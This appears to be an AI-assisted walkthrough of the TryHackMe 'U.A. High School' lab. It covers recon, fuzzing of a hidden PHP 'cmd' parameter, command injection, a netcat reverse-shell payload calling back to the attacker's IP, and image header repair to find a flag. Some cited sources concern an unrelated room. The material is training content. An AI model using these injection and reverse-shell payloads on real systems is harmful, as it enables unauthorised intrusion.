## 🎯 Overview & Attack Surface

**Target**: Linux-based web server, HTTP on port 80 (and possibly SSH/22 if later accessible) ([Medium](https://medium.com/%40mysticraganork66/tryhackme-u-a-high-school-writeup-0b5da6214ede?utm_source=chatgpt.com "TryHackMe — U.A. High School Writeup | by 0verlo0ked"))  
**Goal**: Obtain `user.txt` and `root.txt` flags via remote command execution or reverse shell.  
**Vulnerabilities**: Web-based command injection vulnerability via hidden endpoint with `cmd` parameter in a PHP script.

---

## Step 1: Recon & Enumeration

### 1.1 Nmap Scan

Run full scan:

```bash
nmap -sV -sC -A -T4 <target_IP> -Pn
```

Look for open ports—HTTP 80 confirmed; no FTP/SSH until post-shell ([Medium](https://medium.com/%40mysticraganork66/tryhackme-u-a-high-school-writeup-0b5da6214ede?utm_source=chatgpt.com "TryHackMe — U.A. High School Writeup | by 0verlo0ked"))

### 1.2 Browse Web

Navigate to HTTP homepage: normal, static.  
Source includes a `PHPSESSID` cookie—suggests server uses PHP; likely there are `.php` endpoints. ([Medium](https://grish0111.medium.com/tryhackme-u-a-high-school-writeup-85237130a2c8?utm_source=chatgpt.com "Tryhackme — U.A. High School writeup | by Grishma Acharya"))

### 1.3 Directory/File Fuzzing

Use ffuf or gobuster to find hidden endpoints:

```bash
ffuf -u http://<IP>/assets/index.php?FUZZ=id -w /usr/share/seclists/Discovery/Web-Content/raft-small-words-lowercase.txt -mc all
```

Find parameter name: `cmd` through fuzzing enumeration ([Medium](https://grish0111.medium.com/tryhackme-u-a-high-school-writeup-85237130a2c8?utm_source=chatgpt.com "Tryhackme — U.A. High School writeup | by Grishma Acharya"))

---

## Step 2: Exploitation — Command Injection

### 2.1 Test Command Execution

```bash
curl -s "http://<IP>/assets/index.php?cmd=id" | base64 -d
```

Output a base64 encoded string, decode to get `uid=33(www-data)...`. Confirms server runs commands and returns base64. ([TryHackMe](https://tryhackme.com/room/yueiua?utm_source=chatgpt.com "U.A. High School"))

### 2.2 Blind Enumeration (optional)

To list directory:

```bash
curl -s -G --data-urlencode 'cmd=ls -lah /var/www/html/assets' "http://<IP>/assets/index.php" | base64 -d
```

---

## Step 3: Get a Shell (Optional, if allowed)

### 3.1 Reverse Shell Payload

Set up listener:

```bash
nc -lvnp 4444
```

Then execute:

```
http://<IP>/assets/index.php?cmd=busybox%20nc%20<yourIP>%204444%20-e%20/bin/bash
```

If busybox not available, try:

```bash
cmd=nc%20<yourIP>%204444%20-e%20bash
```

Check for connection as user `www-data` ([Medium](https://medium.com/%40mysticraganork66/tryhackme-u-a-high-school-writeup-0b5da6214ede?utm_source=chatgpt.com "TryHackMe — U.A. High School Writeup | by 0verlo0ked"))

---

## Step 4: Flag Hunting

### 4.1 Locate Hidden Images

Directory listing shows:

```
assets/images/oneforall.jpg
assets/images/yuei.jpg
```

Download:

```bash
wget http://<IP>/assets/images/yuei.jpg
wget http://<IP>/assets/images/oneforall.jpg
```

But one image doesn’t open properly—its headers mismatch the extension. ([X (formerly Twitter)](https://x.com/hoodietramp/status/1827424125402665159?utm_source=chatgpt.com "UA High School TryHackMe Walkthrough | Easy - X"), [Medium](https://grish0111.medium.com/tryhackme-u-a-high-school-writeup-85237130a2c8?utm_source=chatgpt.com "Tryhackme — U.A. High School writeup | by Grishma Acharya"))

### 4.2 Fix Image Format

Use a hex editor or `xxd` to view header:

- JPG header: `FF D8 FF E0 00 10 4A 46 49 46 00`
    
- PNG header: `89 50 4E ...`
    

Correct file extension or header and reopen—reveals the flag or embedded data. ([Medium](https://grish0111.medium.com/tryhackme-u-a-high-school-writeup-85237130a2c8?utm_source=chatgpt.com "Tryhackme — U.A. High School writeup | by Grishma Acharya"))

---

## Step 5: Privilege Escalation (Root)?

Some writeups mention only basic flags and no root escalation. If `root.txt` exists but not accessible by `www-data`, attempt enumeration: check `/etc/passwd`, sudo configuration, readable files. If no escalation path described publicly, room may only include user flag. Confirm in room tasks.

---

## 📋 Sample Documentation Table

|Phase|Purpose|Commands / Payloads|
|---|---|---|
|Nmap scan|Identify open ports/services|`nmap -sCV -T4 <IP>`|
|Fuzzing files|Discover hidden endpoints|`ffuf -u … index.php?FUZZ`|
|Command Injection|Test exploit point|`cmd=id`, `cmd=ls`|
|Reverse shell|Gain remote shell|`nc -lvnp 4444` + remote payload|
|File retrieval|Get hidden files/images|`wget http://<IP>/assets/images/...`|
|Image repair|Extract hidden content|change header bytes, open file|

---

## 🧠 Lessons & Mastery Takeaways

- Hidden parameters in PHP endpoints can allow **command injection**, but only if input flows directly to `system()`, `popen()`, or similar without sanitization.
    
- Use **fuzzing tools** like ffuf with wordlists to reveal hidden endpoints, especially under `/assets/…`.
    
- Base64 output is common in minified API endpoints—**always decode**.
    
- When downloading binary files (images, logs), don’t trust extension—**always inspect magic bytes**.
    
- **Shell delivery** must be tested: busybox vs standard nc, adjust payload URI‑encoding.
    
- Check for privilege escalation vectors if allowed—otherwise, confirm if root flag exists.
    

---

## 🧪 CTF‑Style Challenge

**Reproduce this yourself:**

1. Deploy the target machine and get its IP.
    
2. Run enumeration: nmap + gobuster/ffuf.
    
3. Identify `cmd` injection endpoint.
    
4. Extract `user.txt` content either via shell or via image.
    
5. Document every tool used, every flag captured, every command.
    

**Next step**: Try to script the injection to automate enumeration (e.g. multiple `cmd=cat *.txt` queries), or write a small Bash/Python script to issue queries and parse base64 responses.

---

## ✅ Final Notes

- Room difficulty: listed as _easy_, but range to _medium_ due to image header manipulation and blind injection pattern ([InfoSec Write-ups](https://infosecwriteups.com/u-a-high-school-tryhackme-walkthrough-writeup-beginner-friendly-thm-sunny-802daabf3ac4?utm_source=chatgpt.com "U.A. High School TryHackMe Walkthrough | Writeup"), [blog.razrsec.uk](https://blog.razrsec.uk/lian-yu-walkthrough/?utm_source=chatgpt.com "[TryHackMe] Lian_Yu Walkthrough - razrsec"), [Medium](https://medium.com/%40mysticraganork66/tryhackme-u-a-high-school-writeup-0b5da6214ede?utm_source=chatgpt.com "TryHackMe — U.A. High School Writeup | by 0verlo0ked"), [Medium](https://grish0111.medium.com/tryhackme-u-a-high-school-writeup-85237130a2c8?utm_source=chatgpt.com "Tryhackme — U.A. High School writeup | by Grishma Acharya"), [Medium](https://blog.carsonshaffer.me/tryhackme-lian-yu-writeup-5a364848862b?utm_source=chatgpt.com "TryHackMe | Lian_Yu Writeup - Carson Shaffer"))
    
- Provided flags: both user and sometimes root—double‑check tasks.
    
- Always document your actions: Why tool X? What do you expect? What was the output?
    

---

